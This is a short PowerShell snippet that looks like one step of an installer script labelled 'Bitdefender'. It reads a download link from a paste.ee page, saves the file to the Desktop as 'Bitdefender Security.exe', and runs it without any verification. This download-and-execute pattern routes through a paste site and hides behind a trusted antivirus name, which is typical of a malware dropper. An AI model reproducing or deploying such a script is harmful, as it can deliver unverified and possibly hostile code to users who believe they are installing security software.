


Write-host "    Bitdefender:"
$File = Join-path -Path ([Environment]::GetFolderPath("Desktop")) -Childpath "Bitdefender Security.exe"
$link = irm https://paste.ee/p/0V3I7aeY
Write-host "`t - Downloading.."
(New-Object net.webclient).Downloadfile($link, $File )
Write-host "`t - Opening.."
Start-Process -FilePath $File



